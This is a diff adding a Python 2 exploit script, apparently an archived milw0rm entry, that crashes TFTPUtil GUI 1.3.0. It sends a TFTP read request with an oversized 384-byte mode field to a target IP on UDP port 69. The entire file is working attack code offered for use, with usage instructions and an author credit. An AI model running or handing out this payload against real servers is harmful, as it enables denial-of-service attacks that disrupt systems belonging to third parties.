@@ -1,0 +1,29 @@
+#!/usr/bin/python
+
+import socket
+import sys
+from time import *
+
+#Download:http://www.brothersoft.com/tftputil-131537.html
+#Note; Good Ramadan For all MuSLimS
+if len(sys.argv)!=2:
+ print "[x]TFTPUtil GUI 1.3.0 GUI Remote Denial Of Service Exploit"
+ print "[x]Author : ThE g0bL!N"
+ print "[x]Big Thanx : His0k4\n"
+ print "[+]Usage: %s <target_ip>" %sys.argv[0]
+ sys.exit(0)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+mode = "\x41"*384
+
+filename = "test"
+
+payload = "\x00\x01" + filename + "\x00" + mode + "\x00"
+
+print "[x] Sending the payload..."
+sleep(2)
+s.sendto(payload, (sys.argv[1], 69))
+print "[x] Done!"
+
+# milw0rm.com [2009-08-26]
